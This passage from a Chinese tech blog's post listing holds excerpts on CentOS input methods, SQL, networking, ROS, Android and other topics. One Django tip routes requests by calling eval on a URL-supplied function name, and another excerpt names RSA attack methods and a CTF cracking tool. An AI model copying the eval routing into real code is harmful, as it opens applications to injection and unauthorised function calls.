搜狗和谷歌输入法等使用的是fcitx框架，需要安装fcitx!
不可直接卸载ibus ！！！ 不可直接卸载ibus！！！不可直接卸载ibus！！！
会造成删除Gnome依赖导致桌面无法启动，正确的卸载方式是只删除ibus而不删除依赖。
在安装之前先更新 yum update
不然失败的机率会大大增加！
单独卸载ibus软件，不卸载依赖包！
rpm -e --nodeps ibus
安装epel库源
yum -y install epel-release
安装fcitx
yum -y install fcitx fcitx-pinyin fcitx-configtool
设置fcitx为自启动项：
在Tweaks里-&gt;Startup Application添加fcitx为自启动项
在 /etc/profile.d 中增加一个配置脚本命名为 fcitx.sh
vi /etc/profile.d/fcitx.sh
内容如下：
export GTK_IM_MODULE=fcitx
export QT_IM_MODULE=fcitx
export XMODIFIERS=@im=fcitx
(有的教程加上了双引号，我的是7.7 不带双引号才能识别）
如果遇到配置自启动后开关机时间过长：
修改重启或关机时 systemd 等待 fcitx 进程的时长，默认是 90 秒，我们可以把它改为最多只等待 10 秒，就会起到快速重启或关机不再长时间等待的效果了。
具体是修改 /etc/systemd/system.conf 文件，将其中的 #DefaultTimeoutStopSec=90s 这一行前面的 # 去掉，然后将其赋值改为 10s 保存即可。
三、安装搜狗输入法
安装依赖软件
yum install qtwebkit -y
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/571e04cfac0b2c9a73cdb8f886c48265/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24027fcf760f271c18d01384cc9bcc83/" rel="bookmark">
			面试官:用exists代替in真的好么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在面试谈到sql优化的一些经验时，有些面试者会回答：写sql时，最好用exists来代替in，因为in不走索引，所以用exists的sql性能较好，那真的是这样么？
以下用AB两表，做个示例，两表都有一个id字段，而两个表都为id字段建立了索引
in的作用其实就是把范围内存在的数据做个返回，先看看下图的简单示例sql：
select * from A where id in (select id from B) 这句sql等价于两个循环：
for select id from B for select * from A where A.id = B.id 其实就是对B表的id做个外层循环，而内层再嵌套一层A表的id循环，内层循环里判断A表和B表的id是否相等，相等的话就是要返回的数据。
exists的作用就是把主查询的数据，放到自查询中做条件的验证，结果是true则保留主查询中的结果，为false则不保留，以下用exists实现和in一样的效果：
select * from A where exists(select * from B where B.id = A.id) 这句sql也等价于两个循环：
for select * from A for select * from B where B.id = A.id 其实就是对A表的id做个外层循环，而内层再嵌套一层B表的id循环，内层循环里判断B表和A表的id是否相等，相等的话就是要返回的数据。
这时引申出一个sql优化的规则：以小表驱动大表，mysql连接数会更少，sql性能会更佳
分析下，用in时，是in里面的表驱动外面的表，所以如果B表相对于A表是小表，用in比较好。而用exists时，是外面的表驱动exists里面的表，所以如果A表相对于B表是小表，则用exists比较好。
总结
明白了in和exists的原理后，配合上小表驱动大表的优化规则，可以得出用exists或者是用in，还需要根据表中数据情况而定。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/377045f4647dc6f9238d2ff92a94e350/" rel="bookmark">
			[计算机网络]-物理层
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接
物理层概述 物理层功能 提供透明的比特流传输(利用传输介质为数据链路层提供物理连接)，规范了网络硬件的特性，规格和传输速度
注意: 物理层上的传输从不关心比特流里面携带的信息，只关心比特流的正确搬运封装好的数据以“0，1”比特流的形式进行传递，从一个地方搬到另一个地方 四大特性 机械特性 指明接口所有接线器的形状，尺寸，引脚数和排列等，例如RJ45
电气特性 指明在接口电缆的各条线上出现的电压的范围
功能特性 指明某条线上出现的某一电平的电压表明何种意义
规程特性 指明对于不同功能的各种可能时间的出现顺序，规程的概念类似于协议
物理层上数据的传输形式：信号 信号：数据的电气或电磁表现 模拟信号：对应时域的信号取值连续数字信号：对应时域的信号取值离散–(数字信号中有"码元"概念：不同离散值的基本波形) 信号在信道/传输介质上传输 信号在传输的过程中可以看作是很多不同频率的分量的传输，其中的高频分量由于不等量衰减，使得接收方收到的信号是衰减和变形的
在0~fc这一频段内，振幅传播过程中不会明显衰减，就称fc为截止频率(单位：赫兹)
物理带宽 传输过程中振幅不会明显衰减的范围 物理带宽是一种物理特性，取决于介质材料构成，厚度，长度等 数字带宽与物理带宽之间的关系 奈奎斯特定理(理想信道的最大传输速率) 在无噪声信道中，物理带宽为 B Hz，信号离散等级为V级，则该信道最大传输速率(数字带宽C)可用公式表达：
C=2Blog_2V(bps) 奈奎斯特定理表明任意信号通过一个物理带宽为B的低通滤波器，只要进行每秒2B次的采样就可完全重构出被滤掉的信号，任何高于2B次的采样都毫无意义
香农定理(实际信道的最大传输速率) 在有噪声信道中，物理带宽为 B Hz，信噪比为 S/N，则该信道最大传输速率(数字带宽C)可用公式表达：
C=Blog_2(1+\frac{S}{N})(bps) 香农定理表明在信道一定时，物理带宽已经确定，要想提高数字带宽只有增加信噪比
很多情况下，噪声利用分贝进行表示，分贝(dB)与信噪比(S/N)之间的转换关系如下： 分贝值=10log_{10}\frac{S}{N}(dB) 计算例题： 有一条4-kHz的无噪声信道，每秒采样8000次，如果每个采样是16比特，则信道的最大传输速率是_____________kbps 解题：套用乃奎斯特定理
最大传输速率 = 2Blog_2V(bps)=2*4K*16bit=128kbps 注意：每个采样16比特，相当于信号级别(V)是2^16
如果一个二进制信号通过一条4-kHz的噪声信道，噪声是30分贝，则最大传输速率是____________________ kpbs 解题：
30dB=10log_{10}\frac{S}{N}(dB) 易得S/N=1000。所以:
C=4K*log_2(1+1000) 最大传输约等于40kbps
引导性传输介质 传输介质按照是否有形分为引导性(有线)与非引导性(无线)两大类 引导性传输介质包括铜线，光纤等，非引导性传输介质有无线电卫星等 同轴电缆 由四部分组成，内部的中心导体，包裹在外部的绝缘材料层，网状导体以及外部绝缘层 按照阻抗可分为： 基带同轴电缆：阻抗50Ω，用于数字传输(屏蔽层为铜)宽带同轴电缆：阻抗75Ω，用于模拟传输(屏蔽层为铝) 按照粗细分为： 粗缆：最大传输距离500m细缆：最大传输距离185m 双绞线(Twist Pair Cable) 由两根具有绝缘层的铜导线按一定密度，逆时针方向绞合而成 这种绞合可以消除近端串扰(Crosstalk)
绞距(扭距) 绞距越小，越均匀，则抵消效果越好，传输性能越好
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/377045f4647dc6f9238d2ff92a94e350/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6446e1c95ffbdf1ad68a607041213db/" rel="bookmark">
			房多多面试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java基础 1. hashMap和hashTable区别。
2. concurrenthashMap里面的扩容机制。
3. List，Set，Map之间的区别。
4. jvm年轻代为啥是8：1：1。
5. A a = new A(),从类加载器说起。
6. spring事务管理和spring里面的隔离级别。
7. mybatis里面#和$区别。
8. 三次握手和四次挥手，以及下载99%为啥会卡一下，解释一下原因。
9. sed和awk区别。
10. 讲一下知道的八大排序。特别说一下堆排序实现，以及复杂度。
11. 如何保证一个类是线程安全的，说出至少3中以上方法。
12. 服务以启动cpu就飙高，怎样排查问题，可能是什么原因导致的。
13. 如何在很大很大的树里面找到中值。说出思路。
14. 讲一下二分法。以及时间复杂度。
15 .CAP讲一下，什么时候用cp，什么时候用ap。
16. 熔断和降级的区别。
18. 网关如何设计。
19. 讲一下mysql里面的Innodb,以及B+树。
20. 下来就是聊项目。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ecd920979baedc9a3a45fbb8d1b725b/" rel="bookmark">
			华为面试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java基础
1.主要是靠算法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a6f1864f11170393667dbe3fb5b93d1/" rel="bookmark">
			Requested data length 88431035 is longer than maximum configured RPC length 67108864.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HDFS DataNode RPC 异常 Requested data length 88431035 is longer than maximum configured RPC length 67108864.
异常信息 2020-04-05 08:29:19,993 WARN org.apache.hadoop.ipc.Server: Requested data length 88431035 is longer than maximum configured RPC length 67108864. RPC came from xxx.xxx.xxxx.xxx 2020-04-05 08:29:19,993 INFO org.apache.hadoop.ipc.Server: Socket Reader #1 for port 8022: readAndProcess from client xxx.xxx.xxxx.xxx threw exception [java.io.IOException: Requested data length 88431035 is longer than maximum configured RPC length 67108864. RPC came from xxx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a6f1864f11170393667dbe3fb5b93d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8e68e663af0bbc8c76ad5a4b4af2daa/" rel="bookmark">
			ROS中map、odom、base_link坐标系的理解和这三个坐标系在AMCL中的关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学了ROS快一年了，依旧对map坐标系、odom坐标系、base_link坐标系之间的关系不是很清晰，这段时间下定决心要捋清楚他们之间的关系。
map坐标系：地图坐标系，是一个固定的坐标系；
base_link：机器人本体坐标系，一般和机器人的中心重合，会随着机器人的运动而运动；
odom坐标系：里程计坐标系，不是固定的坐标系，是可以运动的。odom相当于是根据实际计算得到的坐标和真实坐标之间的变换虚拟出来的一个坐标系（原因见下面的举例说明）。
一、前提说明： 首先先明确一点，我们计算移动机器人走了多远，是根据编码器信息（也就是里程计数据）来获得的。
在起始位置，机器人静止，
在map坐标系下实际位置是0；此时里程计数据也是0，所以根据里程计数据计算得到的运动距离是0，计算得到的机器人位置也在0位置。 所以，在起始位置时，map坐标系和odom坐标系是重合的（注意map坐标系是固定的坐标系，odom坐标系是可以运动的坐标系）。
二、举例说明： 为了简单起见，我们在一维的情况下进行举例讨论。
假设机器人在t=0时刻从起点x=0处开始运动，一段时间t时刻后到达某一位置A点(x=7m)；在这段时间内，利用里程计数据计算得到机器人运动了10m（只能利用里程计数据来计算距离，然后得到现在的位置），但是实际在地图中，机器人的实际位置是x=7m(A点)。
所以计算的坐标和真实坐标之间出现了偏差。但是在ROS中换了一个说法，不说计算得到的坐标在map坐标系中漂移了3m，而是说是odom坐标系相对于map坐标系漂移了3m。具体看下图：
所以，base_link坐标系相对于map坐标系的真实位置是7m，odom坐标系相对于map坐标系的漂移是 -3m（也就是map坐标系相对于odom坐标系的漂移是 3m），计算出来的base_link坐标系相对于odom坐标系的距离是10m ，因此 10m= 7m+3m;
当然使用IMU作积分来计算里程计信息，会随着时间的累积，IMU会产生累积误差，和上面的编码器来计算里程计信息产生误差是一样的情况。
所以odom相当于是根据实际计算得到的坐标和真实坐标之间的变换虚拟出来的一个坐标系。
这里引用ros官网资料上面的一个图：
Relationship between Frames
（The map frame is the parent of odom, and odom is the parent of base_link. Although intuition would say that both map and odom should be attached to base_link, this is not allowed because each frame can only have one parent.）
map坐标系是odom的父坐标系，odom是base_link的父坐标系。尽管直觉会说map坐标系和odom坐标系都应该连接到base_link坐标系，但这是不允许的，因为每个坐标系只能有一个父坐标系。
三、AMCL定位中的坐标系关系： 对于上图上半部分Odometry Localization ,纯粹的里程计定位，它是直接根据里程计信息，来计算出base_frame 和odom_frame 之间的偏移，这种情况一般是默认map坐标系和odom坐标系始终是绑在一起的，始终是重合的。所以会有累积误差，随着里程计的增加，它往往会偏差越来越大，越漂越远。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c8e68e663af0bbc8c76ad5a4b4af2daa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a29d86365df8c0c2c37cb25ca52e4bf2/" rel="bookmark">
			KBEngine源码剖析3——移动同步分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		移动应该说是网游里面最最基础的操作了， 但也是很重要的模块，不同类型游戏对于移动同步的精准度都是不同的，对于mmo这类非战斗向核心的游戏来说，通常对于主从客户端位置精准度要求不高，moba类游戏则比较重视主从客户端位置的精准度。由此，这两类游戏的同步策略一般也都是不同的。
为了追求高同步性的，往往会关闭掉客户端先行等策略，然后采用服务器驱动主从客户端位置更新的强一致性策略；如果同步性要求不是特别敏感，则可以采取先行等方式，同时容易提升操作手感。
=.= 好像扯远了，那些同步的策略其实属于产品层面了。但引擎层实现的同步一般都是最基础的，在做产品同步策略前，肯定要先对引擎的底层同步时机有一定了解，下面主要介绍的是引擎层面的流程细节。
操作时序图
移动应该说是网游里面最最基础的操作了， 但也是很重要的模块，不同类型游戏对于移动同步的精准度都是不同的，对于mmo这类非战斗向核心的游戏来说，通常对于主从客户端位置精准度要求不高，moba类游戏则比较重视主从客户端位置的精准度。由此，这两类游戏的同步策略一般也都是不同的。
为了追求高同步性的，往往会关闭掉客户端先行等策略，然后采用服务器驱动主从客户端位置更新的强一致性策略；如果同步性要求不是特别敏感，则可以采取先行等方式，同时容易提升操作手感。
=.= 好像扯远了，那些同步的策略其实属于产品层面了。但引擎层实现的同步一般都是最基础的，在做产品同步策略前，肯定要先对引擎的底层同步时机有一定了解，下面主要介绍的是引擎层面的流程细节。
操作时序图
————————————————
版权声明：本文为CSDN博主「书影_」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/it_wjw/article/details/105318401
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ec97077590f511f19d3ee706ebdcf20/" rel="bookmark">
			用 HTML 做一个表单模板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 HTML1. 模板案例2. 常用标签a. 标题 hnb. 水平线 hrc. 段落 br p alignd. 超链接 a hrefe. 图片 img src width height altf. 列表 ul ol lig. 容器标签 div spanh. 实体字符 &amp;emsp &lt; &gt; &amp; × ¥ $i. 基本表格 table caption tr th td border cellspacing cellpadding bgcolorj. 表格合并 td colspan rowspan 3. HTML 表单a. 表单控件 action method name value type select textareab. 表单提交 get posti. get 提交ii. post 提交iii. get 与 post 请求方式区别 HTML HTML（Hyper Text Markup Language）超文本标记语言； 超文本：不仅可以展示文字，还可以显示超链接、图片、音乐、视频等丰富内容；标记语言：描述特定功能的标签；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ec97077590f511f19d3ee706ebdcf20/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/130a3527fdc16b01fe5a8deccb714793/" rel="bookmark">
			工程数学 | 两种中值定理傻傻分不清
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.拉格朗日中值定理 如果函数f(x)满足：
（1）在闭区间[a,b]上连续；
（2）在开区间(a,b)内可导；
通俗来讲是说连续可导的一段区间，定能在其中找到一个点的斜率，等于收尾连线的斜率
几何学意义：切线斜率等于割线斜率
运动学意义：曲线运动过程中总能找到一个点的速率（瞬时），等于整个运动过程的平均速率。
2.积分第一中值定理 简单来讲 就是在一段连续曲线中定能找到一个点的值，乘以区间长度等于该区间图线下的面积。
积分中值定理在应用中所起到的重要作用是可以使积分号去掉，或者使复杂的被积函数化为相对简单的被积函数，从而使问题简化。
例如在求交流电压的有效值的时候，应用此法可快速推导出有效电压。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4695f7edcc9a7ebcbbf220c04064d81c/" rel="bookmark">
			订单铃声提醒
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40ed57a33c6a0eaa531ddb579a9b9d58/" rel="bookmark">
			django实现动态路由的简单方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 使用django的时候需要配置路由这样做的好处根据请求名，调用函数在app.view文件中别忘了记得在django.setting 中添加app名称ajax 携带口令常用配置 使用django的时候需要配置路由 需要在url中进行路由配置，很麻烦、
path(‘new/’, include(‘newxichentousystem.urls’)),
关键还有再配置子路由，也很麻烦
这样做的好处 整个项目只需要有一个url.py 文件即可
根据请求名，调用函数 from django.conf.urls import url from django.contrib import admin from django.urls import path, include,re_path from django.views.static import serve from django10 import settings from villagemanage import views as views1 from newxichentousystem import views as views2 from dongtailuyou import views as views3 urlpatterns = [ path('admin/', admin.site.urls), path('', views1.index, name='index'), re_path(r'^dturl/(?P&lt;fucname&gt;[a-zA-Z0-9]+)/$',views3.usefucbyname), url(r'^media/(?P&lt;path&gt;.*)', serve, {"document_root":settings.MEDIA_ROOT}), ] 在app.view文件中 放在页面开头就好
def usefucbyname(request,fucname): return eval(fucname)(request) 别忘了记得在django.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/40ed57a33c6a0eaa531ddb579a9b9d58/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7674a762c4f774cb7026a9638c85eefa/" rel="bookmark">
			单片机C语言C51的语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. if语句
if语句是C51中的一个基本条件选择语句，它通常有三种格式：
（1）if （表达式） {语句；}
（2）if （表达式） {语句1；} else {语句2；}
（3）if （表达式1） {语句1；}
else if （表达式2） （语句2；）
else if （表达式3） （语句3；）
……
else if （表达式n-1） （语句n-1；）
else {语句n}
【例】 if语句的用法。
（1）if (x!=y) printf(“x=%d,y=%d\n”,x,y);
执行上面语句时，如果x不等于y，则输出x的值和y的值。
（2）if (x&gt;y) max=x;
else max=y;
执行上面语句时，如x大于y成立，则把x送给最大值变量max，如x大于y不成立，则把y送给最大值变量max。使max变量得到x、y中的大数。
（3）if (score&gt;=90) printf(“Your result is an A\n”);
else if (score&gt;=80) printf(“Your result is an B\n”);
else if (score&gt;=70) printf(“Your result is an C\n”);
else if (score&gt;=60) printf(“Your result is an D\n”);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7674a762c4f774cb7026a9638c85eefa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e22d51eaf99d6ac72d0d83546393fc1/" rel="bookmark">
			破解公钥加密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		模数分解：可以把模数丢到yafu或者factordb.com进行尝试；
指数安全性:Wiener Attack；
复用安全性：共模攻击；
Github上有人对此进行了一定的整合：
https://github.com/Ganapati/RsaCtfTool
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc3b5eaa7b31b46de490fbf80bb63eb0/" rel="bookmark">
			使用EF.Core将同一模型映射到多个表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 EntityFramework Core 中，我们可以使用属性或Fluent API来配置模型映射。有一天，我遇到了一个新的需求，有一个系统每天会生成大量数据，每天生成一个新的表存储数据。例如，数据库如下所示：
所有表都具有相同的结构。那么，如何更改映射以避免创建多个模型呢？
在本文中，我将向您展示如何更改映射以处理这种情况。您也可以使用此方法扩展出更多的用法。
创建 .NET Core 3.1 项目 现在，我们可以使用.NET Core 3.1，它是.NET Core的LTS版本，将来可以轻松将其升级到.NET 5。
假设您已经在计算机上安装了最新的.NET Core SDK。如果没有，则可以从https://dotnet.microsoft.com/download下载。然后，您可以使用dotnet CLI创建项目。对于此示例，我将使用.NET Core 3.1。
让我们创建一个名为DynamicModelDemo的新.NET Core Console项目:
dotnet new console --name DynamicModelDemo 然后用以下命令创建一个新的解决方案:
dotnet new sln --name DynamicModelDemo 接下来使用以下命令把刚才创建的项目添加到解决方案：
dotnet sln add "DynamicModelDemo/DynamicModelDemo.csproj" 接下来可以用Visual Studio打开解决方案了。
创建模型 该模型非常简单。在项目中添加一个名为ConfigurableEntity.cs的新文件：
using System; namespaceDynamicModelDemo { publicclassConfigurableEntity { publicint Id { get; set; } publicstring Title { get; set; } publicstring Content { get; set; } public DateTime CreateDateTime { get; set; } } } 我们将使用CreateDateTime属性来确定模型应该映射到哪个表。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc3b5eaa7b31b46de490fbf80bb63eb0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57f68cadbd403e5f6a7795d61967cf3b/" rel="bookmark">
			Android移动开发应用笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android系统中有著名的4大组件：Activity、Service、BroadcastReceiver、ContentProvider，4大组件在使用时均要在清单文件AndroidManifest.xml中注册
Activity负责加载View组件并且与用户交互，所有Activity组件均继承Activity类。
View组件是所有UI组件、容器组件的基类。
Serivce主要完成类似下载文件、播放音乐等无需用户界面与用户交互的功能，继承Service类。
ContentProvider可以在其他应用中对这个应用暴露出来的数据进行增、删、改、查。
Intent在开启过程中可以进行各组件间数据传递。
颜色的表示格式
#RGB
#RRGGBB
#ARGB
#AARRGGBB
这4种数据格式，R代表红色值，G代表红色值，B代表蓝色值，A代表透明度。
尺寸的单位
px（像素）
in（英寸）
mm（毫米）
pt（磅）
dip（与密度无关的像素）
sp（与刻度无关像素）
MediaPlayer常用方法
android.permission.ACCESS_COARSE LOCATION
//允许一个程序访问Cell ID或WiFi来获取粗略的位置
android.permission.ACCESS_FINE_LOCATION
//允许一个程序访问精确位置(如GPS)
android.permission.ACCESS_NETWORK_STATE
//允许程序访问有关的网络信息
android.permission.ACCES_SURFACE_FLINGER
//允许程序使用SurfaceFlinger底层特性
android.permission_ACCESS WIFI_STATE
//允许程序访问WiFi网络状态信息
android.permission.BATTERY_STATS
//允许程序更新手机电池统计信息
android.permission. BLUETOOTH
//允许程序连接到已配对的蓝牙设备
android.permission.BLUETOOTH_ADMIN
//允许程序发现和配对蓝牙设备
android.permission.CAMERA
//请求访问使用照相设备
android.permission.CHANGE_NETWORK_STATE
//允许程序改变网络连接状态
android.permission.CHANGE_WIFI_STATE
//允许程序改变WiFi连接状态
android.permission.DELETE_CACHE_FILES
//允许程序删除缓存文件
android. permission.DELETE_PACKAGES
//允许一个程序删除包
android.permission.INSTALL_PACKAGES
//允许一个程序安装packages
android.permission.INTERNET
//允许程序打开网络
android.permission.READ_CALENDAR
//允许程序读取用户日历数据
android.permission.READ_LOGS
//允许程序读取底层系统日志文件
android.permission.READ_PHONE_STATE
//允许读取电话的状态
android.permission.READ_SMS
//允许程序读取短信息
android.permission.SEND_SMS
//允许程序发送SMS短信
android.permission.RECEIVE_SMS
//允许程序接收短信息
android prmision.WRITE_SMS
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57f68cadbd403e5f6a7795d61967cf3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1fd80c69d9344eba890593e4ca79529/" rel="bookmark">
			排名前10的vue前端UI框架框架值得你掌握
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://segmentfault.com/a/1190000015423178?utm_source=tag-newest
vue常用ui框架推荐 pc: • element-ui (star:34k)
饿了么前端团队推出的一款基于Vue.js 2.0 的桌面端UI框架
eleme
github
• iview (star:19k)
iview
github
移动端 • vux (star ： 15k)
vux
github
• mint-ui (star:13k)
饿了么前端团队推出的 一个基于 Vue.js 的移动端组件库
mint
github
• Vant (star:7k)
Vant
github
之前得到消息vue在GitHub已经超过react,成为第一大框架，让我们来看看以vue为基础的开发框架有哪些？
Element(start-28128)
饿了么前端推出的基于 Vue.js 2.0 的后台组件库，它能够帮助你更轻松更快速地开发 web 项目
官网地址
http://element.eleme.io/
iview(start-15674)
iview一套基于 Vue.js 的高质量 UI 组件库,友好的 API ，自由灵活地使用空间，细致、漂亮的 UI。由TalkingData开发维护，有很多知名互联网企业都在使用
官网地址https://iviewui.com/
vuetify(start-11449)
一个为 Vue JS 2.0 打造的 Material 风格的组件库,喜欢material design的朋友可以去尝试一下
官网地址https://vuetifyjs.com/
vue-strap(start-4752)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1fd80c69d9344eba890593e4ca79529/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/705fca192ab0160b5510b0bf4aeb6e14/" rel="bookmark">
			ScrollView 滑动停止监听
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		遇到一个需求，在ScrollView中设置一个按钮，滑动的时候隐藏，滑动停止之后1秒再重新显示出来。
由于ScrollView没有提供直接的监听方法，所以要自定义一个ScrollView；实现思路：创建Handler,在ScrollView滑动的时候，先清空所有消息，然后发送延时消息，如果能接收到消息，说明滑动停止，下面是具体实现的代码
package app.view; import android.content.Context; import android.os.Handler; import android.os.Message; import android.support.v4.widget.NestedScrollView; import android.util.AttributeSet; /** Created by XiaoDaAn on 2020/04/02 */ public class ObservableScrollView extends NestedScrollView { private OnScrollStatusListener onScrollStatusListener; public ObservableScrollView(Context context) { super(context); } public ObservableScrollView(Context context, AttributeSet attrs) { super(context, attrs); } public ObservableScrollView(Context context, AttributeSet attrs, int defStyleAttr) { super(context, attrs, defStyleAttr); } @Override protected void onScrollChanged(int l, int t, int oldl, int oldt) { super.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/705fca192ab0160b5510b0bf4aeb6e14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6e77acde22081e4ce83ed9e4eed3811/" rel="bookmark">
			豆瓣电影最新API接口（亲测可用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言： 开源的豆瓣接口（经测试可使用），最底下是整理的可使用的方法 最新资料1：https://github.com/iiiiiii1/douban-imdb-api​​​​​​​ 官方文档入口：官方api 官方使用地址：https://douban.uieee.com+加上官方对应的方法 官方api截图展示： ***注意 baseUrl:https://douban.uieee.com 经过整理可使用的接口 1、正在上映的电影： url:baseUrl+'/v2/movie/in_theaters' //https://douban.uieee.com/v2/movie/in_theaters methods:'get' 请求参数： params:{ city:'北京' } 2、即将上映的电影：（分页） url:baseUrl+'/v2/movie/coming_soon' //https://douban.uieee.com/v2/movie/coming_soon methods:'get' 请求参数： params:{ start:1, //开始 count:10,//一页展示多少条 } 3、榜单top250（分页） url:baseUrl+'/v2/movie/top250' //https://douban.uieee.com/v2/movie/top250 methods:'get' 请求参数： params:{ start:1, //开始 count:10,//一页展示多少条 } 4、搜索电影 url:baseUrl+'/v2/movie/search' //https://douban.uieee.com/v2/movie/search methods:'get' 请求参数： params:{ start:1, //开始 count:10,//一页展示多少条 q:'张艺谋',//关键词 比如： 张艺谋 tag:'喜剧',//要搜索的电影的标签,比如：动作，奇幻，冒险，喜剧，悬疑，惊悚等 } 更多资料
https://blog.csdn.net/weixin_44506318/article/details/102886537 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd391275de5606c4d03bf29abb0add04/" rel="bookmark">
			True 和 False 可以在数组选择时使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		True 和 False 可以在数组选择时使用
比如
a=[[0],[1]][True] a [1] b=[[0],[1]][False] b [0] 比较典型的一个例子就是计算指定年月日是在这一年中的第几天，因为涉及到闰年和平年的判断。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2eafb97a050aa66336962f4e24e8c3b9/" rel="bookmark">
			axios发送post请求404问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录一下这个问题8
发送的时候请求头一定要带X-Requested-With，来判断他是ajax异步
//axios自带xsrf验证，妙哉
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55d3a27359733e8956dd8d8bdb780a38/" rel="bookmark">
			（记录）PaddleHub创意赛：AI人像抠图及图像合成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 PaddleHub创意赛：AI人像抠图及图像合成一、安装环境（这里面有几个坑）二、接下来就``开始P图1. 引入包2. 加载预训练模型（挺厉害的不得不说）3. 图像合成 PaddleHub创意赛：AI人像抠图及图像合成 本项目根据DeepLabv3+模型一键抠图示例，主要采用PaddleHub DeepLabv3+模型(deeplabv3p_xception65_humanseg)和python图像处理库opencv、PIL等完成。在最新作中，作者通过encoder-decoder进行多尺度信息的融合，同时保留了原来的空洞卷积和ASSP层， 其骨干网络使用了Xception模型，提高了语义分割的健壮性和运行速率，在 PASCAL VOC 2012 dataset取得新的state-of-art performance，该PaddleHub Module使用百度自建数据集进行训练，可用于人像分割，支持任意大小的图片输入。在完成一键抠图之后，通过图像合成，实现扣图比赛任务。
PaddleHub 是基于 PaddlePaddle 开发的预训练模型管理工具，可以借助预训练模型更便捷地开展迁移学习工作，目前的预训练模型涵盖了图像分类、目标检测、词法分析、语义模型、情感分析、视频分类、图像生成、图像分割、文本审核、关键点检测等主流模型。
PaddleHub官网：PaddleHub官网
PaddleHub项目地址：PaddleHub github
更多PaddleHub预训练模型应用可见：教程合集课程
